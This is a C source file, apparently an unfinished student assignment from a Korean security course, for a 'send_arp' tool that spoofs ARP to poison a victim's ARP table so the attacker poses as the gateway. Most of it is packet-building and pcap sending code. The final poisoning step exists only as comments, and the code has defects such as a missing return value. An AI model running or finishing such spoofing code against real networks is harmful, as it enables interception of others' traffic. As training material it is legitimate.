/*
 * Author : Jinkyoung Kim
 *
 * This program changes victim's arp table
 * 
 * contact : kjkjk1178@gmail.com
 */


#include <pcap.h>
#include <stdio.h>
#include <netinet/ether.h>
#include <string.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <linux/if.h>
#include <netdb.h>
#include <netinet/in.h>
#include <linux/ip.h>
#include <unistd.h>

#define ETHERSIZE 14
#define IPADDRLEN 4

/*
패킷 보냄 - arp 
victim과 gateway의 ip, mac을 알아내고 속이기..

pcap_sendpacket 함수 이용...


[리포트]
sender(victim)의 arp table을 변조하라.

sender ip는 victim ip라고도 함.
target ip는 일반적으로 gateway임.

[학습]
구글링을 통해서 arp header의 구조(각 필드의 의미)를 익힌다.



pcap_sendpacket 함수를 이용해서 user defined buffer를 packet으로 전송하는 방법을 익힌다.

attacker(자신) mac 정보를 알아 내는 방법은 구글링을 통해서 코드를 베껴 와도 된다.

arp infection packet 구성에 필요한 sender mac 정보는 프로그램 레벨에서 자동으로(정상적인 arp request를 날리고 그 arp reply를 받아서) 알아 오도록 코딩한다.

최종적으로 상대방을 감염시킬 수 있도록 eth header와 arp header를 구성하여 arp infection packet을 보내고 sender에서 target arp table이 변조되는 것을 확인해 본다.

[제출 기한]
2018.08.06 23:59

절대 KITRI access point 네트워크를 대상으로 테스트하지 말 것. 하려면 핫스팟을 띄워 하거나 BoBDev 라는 access point를 사용할 것.

*/

 pcap_t * handle;

#pragma pack(1) //패딩 삭제
typedef struct myArphdr
{
    uint16_t hardType;		
    uint16_t protoType;	
    uint8_t hardLen;		
    uint8_t protoLen;		
    uint16_t opcode;		

    uint8_t srcMAC[ETH_ALEN];	
    uint32_t srcIP;		
    uint8_t dstMAC[ETH_ALEN];	
    uint32_t dstIP;

}ARPHDR;


void MakeEtherHeader(struct ether_header * eth, uint8_t * dstMAC, uint8_t * srcMAC)
{
    memcpy((char *)eth->ether_dhost, (char*) dstMAC, ETH_ALEN);
    memcpy((char *)eth->ether_shost, (char*) srcMAC, ETH_ALEN);    
    eth->ether_type = htons(ETHERTYPE_ARP);

}

void MakeARP(uint16_t arpType, ARPHDR* arp, uint8_t * dstMAC, uint8_t * srcMAC,  uint32_t dstIP, uint32_t srcIP)
{
    //header
    arp->hardType  = htons(ARPHRD_ETHER);
    arp->protoType = htons(ETHERTYPE_IP);
    arp->hardLen = ETH_ALEN;
    arp->protoLen = IPADDRLEN;
    arp->opcode = htons(arpType); 

    //내용
    memcpy((char *)arp->srcMAC, (char * )srcMAC, ETH_ALEN);
    arp->srcIP = srcIP;
    memcpy((char *)arp->dstMAC, (char * )dstMAC, ETH_ALEN);
    arp->dstIP = dstIP;

}



//
bool SendARP(uint8_t arpType, uint8_t *buf, uint8_t * dstMAC, uint8_t * srcMAC, uint32_t dstIP, uint32_t srcIP)
{
    struct ether_header *eth = (struct ether_header * )buf;
    ARPHDR * arp = (ARPHDR *)((uint8_t *)buf + ETHERSIZE);

    switch(arpType)
    {
    case ARPOP_REQUEST: //0으로 채워야 ...
        uint8_t requestMAC[ETH_ALEN];

        memset(requestMAC, 0xFF, sizeof(requestMAC));
        MakeEtherHeader(eth, requestMAC, srcMAC);

        memset(requestMAC, 0x00, sizeof(requestMAC));
    
        MakeARP(ARPOP_REQUEST, arp, requestMAC, srcMAC, dstIP, srcIP);
        
        break;

    case ARPOP_REPLY:

        MakeEtherHeader(eth, dstMAC, srcMAC); 
    
        MakeARP(ARPOP_REPLY, arp, dstMAC, srcMAC, dstIP, srcIP);
        break;
    }

    //패킷 전송
    pcap_sendpacket(handle, (const u_char *)buf, 0x2a);
}



int main(int argc, char * argv[])
{

    if(argc !=4)
    {
        printf("usage : send_arp <interface> <sender ip> <target ip>\n");
        return 1;

    }

    uint8_t errbuf[PCAP_ERRBUF_SIZE];
    handle = pcap_open_live(argv[1], BUFSIZ, 1, 1000, (char *)errbuf);

    if (handle == NULL) 
    {
        fprintf(stderr, "couldn't open device %s: %s\n", argv[1], errbuf);
        return -1;
    }

    uint8_t buf[0x2a];
    memset(buf, 0, sizeof(buf));

    uint32_t victimIP = inet_addr(argv[2]);
    uint32_t targetIP = inet_addr(argv[3]);

    uint8_t myMAC[ETH_ALEN];



    //내 MAC 얻기
    struct ifreq s;
    int fd = socket(PF_INET, SOCK_DGRAM, IPPROTO_IP);

    strcpy(s.ifr_name, argv[1]);
    if (0 == ioctl(fd, SIOCGIFHWADDR, &s)) 
    {
        memcpy(myMAC, s.ifr_addr.sa_data, ETH_ALEN);
    }
    else
    {
        printf("Fail to get my MAC address!\n");
        return 1;
    }

    
    //피해자의 MAC을 알아온다
    //broadcast
    SendARP(ARPOP_REQUEST, buf, NULL, myMAC, victimIP, targetIP);

    //deadlock 조심
    //timeout 넣을까?
    //get response
    while (true) 
    {
        struct pcap_pkthdr * header;
        const u_int8_t * packet;
        int i = 0;

        int res = pcap_next_ex(handle, &header, &packet);
        if (res == 0) continue;
        if (res == -1 || res == -2) break;
        
        //ARP 응답인지 체크
        
    }


    //내 MAC을 알아온다

    //패킷 생성
    //ETHER
    //      : reciever는 victim MAC
    //      : sender는 내 MAC
    //ARP
    //      i'm target IP


}

